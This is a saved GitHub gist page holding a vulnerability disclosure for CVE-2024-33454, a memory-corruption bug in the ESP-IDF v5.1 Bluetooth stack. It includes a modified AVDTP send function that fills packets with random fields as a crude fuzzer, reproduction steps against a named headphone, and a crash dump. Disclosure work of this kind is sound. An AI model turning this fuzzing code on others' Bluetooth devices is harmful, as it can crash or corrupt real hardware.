=== Content from gist.github.com_3ba39825_20250111_134918.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FZakary-D%2F30f565c4266c02c62aa9089c363e78e9)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FZakary-D%2F30f565c4266c02c62aa9089c363e78e9&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FZakary-D%2F30f565c4266c02c62aa9089c363e78e9) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FZakary-D%2F30f565c4266c02c62aa9089c363e78e9&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@Zakary-D](https://avatars.githubusercontent.com/u/72006414?s=64&v=4)](/Zakary-D)

# [Zakary-D](/Zakary-D)/**[gist:30f565c4266c02c62aa9089c363e78e9](/Zakary-D/30f565c4266c02c62aa9089c363e78e9)**

Last active
May 10, 2024 01:41

Show Gist options

* [Download ZIP](/Zakary-D/30f565c4266c02c62aa9089c363e78e9/archive/dc83c5eb49ba9eba500b0ad533b487784e2bab6a.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FZakary-D%2F30f565c4266c02c62aa9089c363e78e9)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FZakary-D%2F30f565c4266c02c62aa9089c363e78e9)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/Zakary-D/30f565c4266c02c62aa9089c363e78e9.js&quot;&gt;&lt;/script&gt;
* Save Zakary-D/30f565c4266c02c62aa9089c363e78e9 to your computer and use it in GitHub Desktop.

[Code](/Zakary-D/30f565c4266c02c62aa9089c363e78e9)
[Revisions
3](/Zakary-D/30f565c4266c02c62aa9089c363e78e9/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/Zakary-D/30f565c4266c02c62aa9089c363e78e9.js&quot;&gt;&lt;/script&gt;

Save Zakary-D/30f565c4266c02c62aa9089c363e78e9 to your computer and use it in GitHub Desktop.

[Download ZIP](/Zakary-D/30f565c4266c02c62aa9089c363e78e9/archive/dc83c5eb49ba9eba500b0ad533b487784e2bab6a.zip)

CVE-2024-33454 Guru Meditation Error and rebooting when using ESP32 bluetooth

 [Raw](/Zakary-D/30f565c4266c02c62aa9089c363e78e9/raw/dc83c5eb49ba9eba500b0ad533b487784e2bab6a/gistfile1.txt)

[**gistfile1.txt**](#file-gistfile1-txt)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | CVE-2024-33454 |
| --- | --- |
|  |  |
|  |  |
|  | IDF version. |
|  | v5.1.3-416-gd23b7a0361 |
|  |  |
|  | Espressif SoC revision. |
|  | ESP32D0WDQ5(revision 3) |
|  |  |
|  | Operating System used. |
|  | Linux |
|  |  |
|  | How did you build your project? |
|  | Command line with idf.py |
|  |  |
|  | If you are using Windows, please specify command line type. |
|  | None |
|  |  |
|  | Development Kit. |
|  | ESP-WROVER-KIT |
|  |  |
|  | Power Supply used. |
|  | USB |
|  |  |
|  | What is the expected behavior? |
|  | send modified AVDTP packet to peer. |
|  |  |
|  | What is the actual behavior? |
|  | memory corruption and rebooting |
|  |  |
|  | Steps to reproduce. |
|  | 1.modify code: esp-idf/components/bt/host/bluedroid/stack/avdt/avdt\_ad.c |
|  |  |
|  | UINT8 avdt\_ad\_write\_req(UINT8 type, tAVDT\_CCB \*p\_ccb, tAVDT\_SCB \*p\_scb, BT\_HDR \*p\_buf) |
|  | { |
|  | UINT8 tcid; |
|  |  |
|  | /\* get tcid from type, scb \*/ |
|  | tcid = avdt\_ad\_type\_to\_tcid(type, p\_scb); |
|  |  |
|  | srand(time(NULL)); |
|  | // p\_buf[0].event = (uint16\_t)rand(); |
|  |  |
|  | if(type == AVDT\_CHAN\_MEDIA){ |
|  | p\_buf->event = (uint16\_t)rand(); |
|  | p\_buf->len = (uint16\_t)rand() % 255; |
|  | p\_buf->offset = (uint16\_t)rand(); |
|  | p\_buf->layer\_specific = (uint16\_t)rand(); |
|  | for(int i = 0; i < p\_buf->len; ++i) p\_buf->data[i] = (uint16\_t)rand(); |
|  | } |
|  |  |
|  | static int dk\_cnt = 0; |
|  | if(++dk\_cnt % 1000 == 0){ |
|  | dk\_cnt = 0, printf("\n\n avdt\_ad\_write\_req \n"); |
|  | printf("%" PRIu16 " ", p\_buf->event); |
|  | printf("%" PRIu16 " ", p\_buf->len); |
|  | printf("%" PRIu16 " ", p\_buf->offset); |
|  | printf("%" PRIu16 " \n", p\_buf->layer\_specific); |
|  | for(int i = 0; i < p\_buf->len; ++i) printf("%" PRIu16 " ", p\_buf->data[i]); |
|  | printf("\n\n"); |
|  | } |
|  |  |
|  | return L2CA\_DataWrite(avdt\_cb.ad.rt\_tbl[avdt\_ccb\_to\_idx(p\_ccb)][tcid].lcid, p\_buf); |
|  | } |
|  | change the target device name of example/a2dp\_source to my headphone: HUAWEI FreeBuds 4i |
|  | use idf.py to build example/a2dp\_source |
|  | 4.flash it to ESP-WROVER-KIT and monitor it |
|  | 5.about half an hour later, something get wrong and the development board rebooting |
|  |  |
|  | Debug Logs. |
|  | Guru Meditation Error: Core 0 panic'ed (StoreProhibited). Exception was unhandled. |
|  |  |
|  | Core 0 register dump: |
|  | PC : 0x40093232 PS : 0x00060333 A0 : 0x80092e87 A1 : 0x3ffd0350 |
|  | 0x40093232: remove\_free\_block at /root/esp/esp-idf/components/heap/tlsf/tlsf.c:332 |
|  | (inlined by) block\_remove at /root/esp/esp-idf/components/heap/tlsf/tlsf.c:380 |
|  | (inlined by) block\_merge\_next at /root/esp/esp-idf/components/heap/tlsf/tlsf.c:486 |
|  | (inlined by) tlsf\_free at /root/esp/esp-idf/components/heap/tlsf/tlsf.c:1123 |
|  |  |
|  | A2 : 0x3ffcc144 A3 : 0x3ffd7838 A4 : 0x3ffd7830 A5 : 0x3ffc0042 |
|  | A6 : 0x00000028 A7 : 0x00000058 A8 : 0x00000018 A9 : 0x3ffd8844 |
|  | A10 : 0x3ffd8844 A11 : 0x00000000 A12 : 0x0099009d A13 : 0x00000004 |
|  | A14 : 0xb33fffff A15 : 0xb33fffff SAR : 0x0000001c EXCCAUSE: 0x0000001d |
|  | EXCVADDR: 0x009900a9 LBEG : 0x4000c2e0 LEND : 0x4000c2f6 LCOUNT : 0xffffffff |
|  | 0x4000c2e0: memcpy in ROM |
|  | 0x4000c2f6: memcpy in ROM |
|  |  |
|  |  |
|  |  |
|  | Backtrace: 0x4009322f:0x3ffd0350 0x40092e84:0x3ffd0370 0x40082362:0x3ffd0390 0x4009406d:0x3ffd03b0 0x400de242:0x3ffd03d0 0x400df122:0x3ffd03f0 0x400de459:0x3ffd0410 0x4010c2fa:0x3ffd0430 0x400de4b5:0x3ffd0450 0x4010d2ce:0x3ffd0470 0x4010d19a:0x3ffd0490 0x40090ad5:0x3ffd04c0 |
|  | 0x4009322f: remove\_free\_block at /root/esp/esp-idf/components/heap/tlsf/tlsf.c:331 |
|  | (inlined by) block\_remove at /root/esp/esp-idf/components/heap/tlsf/tlsf.c:380 |
|  | (inlined by) block\_merge\_next at /root/esp/esp-idf/components/heap/tlsf/tlsf.c:486 |
|  | (inlined by) tlsf\_free at /root/esp/esp-idf/components/heap/tlsf/tlsf.c:1123 |
|  | 0x40092e84: multi\_heap\_free\_impl at /root/esp/esp-idf/components/heap/multi\_heap.c:231 |
|  | 0x40082362: heap\_caps\_free at /root/esp/esp-idf/components/heap/heap\_caps.c:388 |
|  | 0x4009406d: free at /root/esp/esp-idf/components/newlib/heap.c:39 |
|  | 0x400de242: transmit\_fragment at /root/esp/esp-idf/components/bt/host/bluedroid/hci/hci\_layer.c:350 |
|  | 0x400df122: fragment\_and\_dispatch at /root/esp/esp-idf/components/bt/host/bluedroid/hci/packet\_fragmenter.c:132 |
|  | 0x400de459: event\_packet\_ready at /root/esp/esp-idf/components/bt/host/bluedroid/hci/hci\_layer.c:338 |
|  | 0x4010c2fa: fixed\_queue\_process at /root/esp/esp-idf/components/bt/common/osi/fixed\_queue.c:254 |
|  | 0x400de4b5: hci\_downstream\_data\_handler at /root/esp/esp-idf/components/bt/host/bluedroid/hci/hci\_layer.c:238 |
|  | 0x4010d2ce: osi\_thread\_generic\_event\_handler at /root/esp/esp-idf/components/bt/common/osi/thread.c:425 |
|  | 0x4010d19a: osi\_thread\_run at /root/esp/esp-idf/components/bt/common/osi/thread.c:165 (discriminator 1) |
|  | 0x40090ad5: vPortTaskWrapper at /root/esp/esp-idf/components/freertos/FreeRTOS-Kernel/portable/xtensa/port.c:162 |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |
|  | ELF file SHA256: fb53a7e2e55ccb03 |
|  |  |
|  | Rebooting... |
|  | ets Jul 29 2019 12:21:46 |
|  |  |
|  | CVE-2024-33454 was assigned to this issue. |
|  |  |
|  |  |
|  | > ------------------------------------------ |
|  | > |
|  | > [Vulnerability Type] |
|  | > Buffer Overflow |
|  | > |
|  | > ------------------------------------------ |
|  | > |
|  | > [Vendor of Product] |
|  | > https://github.com/espressif/esp-idf/tree/release/v5.1 |
|  | > |
|  | > ------------------------------------------ |
|  | > |
|  | > [Affected Product Code Base] |
|  | > esp-idf - v5.1 |
|  | > |
|  | > ------------------------------------------ |
|  | > |
|  | > [Affected Component] |
|  | > Bluetooth stack of esp-idf5.1,memory corruption due to missing bounds checking(exp:https://www.esp32.com/viewtopic.php?f=14&t=39478) |
|  | > |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FZakary-D%2F30f565c4266c02c62aa9089c363e78e9)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


